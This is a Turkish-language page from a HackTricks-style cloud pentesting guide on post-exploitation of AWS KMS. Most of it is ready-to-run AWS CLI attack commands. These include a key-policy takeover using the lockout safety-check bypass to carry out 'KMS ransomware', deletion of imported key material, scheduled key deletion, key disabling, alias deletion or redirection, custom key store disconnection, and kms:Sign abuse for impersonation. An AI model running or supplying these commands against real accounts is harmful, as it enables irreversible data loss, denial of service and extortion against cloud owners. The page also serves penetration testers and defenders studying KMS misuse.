# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

Daha fazla bilgi için bak:

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### Şifreleme/Şifre çözme bilgileri

`fileb://` ve `file://` AWS CLI komutlarında yerel dosya yolunu belirtmek için kullanılan URI şemalarıdır:

- `fileb://:` Dosyayı binary modda okur, genellikle metin olmayan dosyalar için kullanılır.
- `file://:` Dosyayı metin modunda okur; genellikle düz metin dosyaları, scriptler veya özel encoding gerektirmeyen JSON için kullanılır.

> [!TIP]
> Dosya içindeki bazı verileri şifre çözmek istiyorsanız, dosya binary veriyi içermelidir, base64 kodlu veri değil. (fileb://)

- **Simetrik** bir anahtar kullanarak
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Bir **asimetrik** anahtar kullanarak:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

KMS üzerinde ayrıcalıklı erişime sahip bir saldırgan, anahtarların KMS politikasını değiştirebilir ve **hesabına bu anahtarlara erişim verebilir**, meşru hesaba verilmiş erişimi kaldırabilir.

Bu durumda, meşru hesap kullanıcıları bu anahtarlarla şifrelenmiş herhangi bir servisin hiçbir verisine erişemeyecek ve bu, hesap üzerinde kolay ama etkili bir ransomware oluşturacaktır.

> [!WARNING]
> Dikkat: **AWS managed keys aren't affected** bu saldırıdan etkilenmez; etkilenenler yalnızca **Customer managed keys**.

> Ayrıca **`--bypass-policy-lockout-safety-check`** parametresinin kullanılması gerektiğini unutmayın (web console'da bu seçeneğin olmaması bu saldırıyı yalnızca CLI üzerinden mümkün kılar).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Bu politikayı değiştirip yalnızca bir external account'a erişim verirseniz ve ardından bu external account'tan orijinal hesaba erişimi geri vermek için yeni bir politika ayarlamaya çalışırsanız, bunu yapamazsınız çünkü Put Polocy action cross account'tan gerçekleştirilemez.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

Küresel bir KMS Ransomware gerçekleştirmek için başka bir yol daha vardır; bu şu adımları içerir:

- Create a new **key with a key material** imported by the attacker
- **Re-encrypt older data** of the victim encrypted with the previous version with the new one.
- **Delete the KMS key**
- Now only the attacker, who has the original key material could be able to decrypt the encrypted data

### kms:DeleteImportedKeyMaterial ile Anahtarları Silme

`kms:DeleteImportedKeyMaterial` iznine sahip bir aktör, `Origin=EXTERNAL` olan CMKs'den (key material'larını import etmiş CMK'ler) imported key material'i silebilir ve böylece bu CMK'ların veriyi decrypt etmesini imkansız hale getirebilir. Bu eylem yıkıcıdır ve uyumlu bir materyal tekrar import edilmedikçe geri döndürülemez; bu da bir saldırganın şifrelenmiş bilgiyi kalıcı olarak erişilemez hale getirerek ransomware-benzeri veri kaybına neden olmasını sağlar.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Anahtarları yok etme

Anahtarları yok etmek DoS gerçekleştirmeye yol açabilir.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> AWS'nin artık önceki eylemlerin bir hesaplar arası ortamdan gerçekleştirilmesini **engellediğini** unutmayın:

### Alias'ı Değiştirme veya Silme
Bu saldırı AWS KMS alias'larını siler veya yönlendirir, key resolution'ı bozar ve bu alias'lara bağlı hizmetlerde hemen hatalara neden olur; bu da bir denial-of-service ile sonuçlanır. `kms:DeleteAlias` veya `kms:UpdateAlias` gibi izinlere sahip bir saldırgan alias'ları kaldırabilir veya yeniden yönlendirebilir ve kriptografik işlemleri (örn., encrypt, describe) bozabilir. Alias yerine key ID'yi referans alan herhangi bir hizmet, alias geri yüklenene veya doğru şekilde yeniden eşlenene kadar başarısız olabilir.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Anahtar Silimini İptal Etme
`kms:CancelKeyDeletion` ve `kms:EnableKey` gibi izinlere sahip bir aktör, bir AWS KMS customer master key'in planlanmış silinmesini iptal edebilir ve daha sonra onu yeniden etkinleştirebilir. Bu işlem anahtarı (başlangıçta Disabled durumda) kurtarır ve daha önce korunmuş verileri deşifre etme yeteneğini geri getirir; böylece exfiltration mümkün olur.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Anahtarı Devre Dışı Bırak

`kms:DisableKey` izniyle bir aktör, bir AWS KMS customer master key'i devre dışı bırakabilir; bu, anahtarın şifreleme veya şifre çözme için kullanılmasını engeller. Bu, o CMK'ye bağımlı hizmetlerin erişimini keser ve anahtar yeniden etkinleştirilene kadar anında aksamalara veya bir denial-of-service'e neden olabilir.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Derive Shared Secret
`kms:DeriveSharedSecret` izni ile, bir aktör KMS'de tutulan bir özel anahtarı ve kullanıcı tarafından sağlanan bir açık anahtarı kullanarak bir ECDH paylaşılan sırrı hesaplayabilir.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
`kms:Sign` izni ile bir aktör, KMS'de saklanan bir CMK'yi özel anahtarı açığa çıkarmadan verileri kriptografik olarak imzalamak için kullanabilir; bu, impersonation'a olanak tanıyabilecek veya kötü amaçlı işlemleri yetkilendirebilecek geçerli imzalar üretir.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### Custom Key Stores ile DoS
`kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore`, veya `kms:UpdateCustomKeyStore` gibi izinlere sahip bir aktör, bir AWS KMS Custom Key Store (CKS) üzerinde değişiklik yapabilir, bağlantısını kesebilir veya silebilir; bu da master anahtarlarını kullanılamaz hâle getirir. Bu, o anahtarlara bağlı hizmetler için şifreleme, şifre çözme ve imzalama işlemlerini bozar ve anında bir denial-of-service'e yol açabilir. Bu nedenle bu izinleri kısıtlamak ve izlemek kritik öneme sahiptir.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
